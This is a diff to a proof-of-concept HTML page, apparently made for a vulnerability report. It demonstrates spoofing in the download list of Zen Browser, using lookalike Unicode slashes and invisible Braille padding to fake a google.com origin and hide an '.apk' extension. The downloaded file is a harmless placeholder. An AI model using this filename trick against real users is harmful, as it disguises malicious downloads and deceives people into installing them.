@@ -38,14 +38,16 @@
   <h1>Download filename origin spoof</h1>
   <p class="lead">Zen Browser 1.24.2b — the download list shows a fake origin and hides the real extension.</p>
 
-  <button id="go">Download</button>
+  <button id="go">Variant A — fake "From" line</button>
+  <button id="go2">Variant B — hidden extension</button>
 
   <pre id="name"></pre>
 
   <ol>
-    <li>Click <b>Download</b>.</li>
+    <li>Click a button.</li>
     <li>Open the Zen library / downloads list.</li>
-    <li>The entry title reads <code>https∶∕∕google.com</code> — the <code>.apk</code> is elided.</li>
+    <li>Variant A reads <code>ini aplikasi apa From https∶∕∕google.com.apk</code>.</li>
+    <li>Variant B reads <code>https∶∕∕google.com</code> — the <code>.apk</code> is elided.</li>
   </ol>
 
   <p class="note">
@@ -64,17 +66,26 @@
 
 <script>
   // U+2236 RATIO, U+2215 DIVISION SLASH x2, U+2800 BRAILLE PATTERN BLANK x40
-  const NAME = "https\u2236\u2215\u2215google.com" + "\u2800".repeat(40) + ".apk";
+  const ORIGIN = "https\u2236\u2215\u2215google.com";
 
-  document.getElementById("name").textContent = NAME;
+  // A: whole string fits in the title (~45 chars), extension stays visible
+  const NAME_A = "ini aplikasi apa From " + ORIGIN + ".apk";
 
-  document.getElementById("go").onclick = () => {
+  // B: invisible padding pushes the extension past the ellipsis
+  const NAME_B = ORIGIN + "\u2800".repeat(40) + ".apk";
+
+  document.getElementById("name").textContent = NAME_A;
+
+  function download(name) {
     const blob = new Blob(["x"], { type: "application/octet-stream" });
     const a = document.createElement("a");
     a.href = URL.createObjectURL(blob);
-    a.download = NAME;
+    a.download = name;
     a.click();
-  };
+  }
+
+  document.getElementById("go").onclick = () => download(NAME_A);
+  document.getElementById("go2").onclick = () => download(NAME_B);
 </script>
 </body>
 </html>
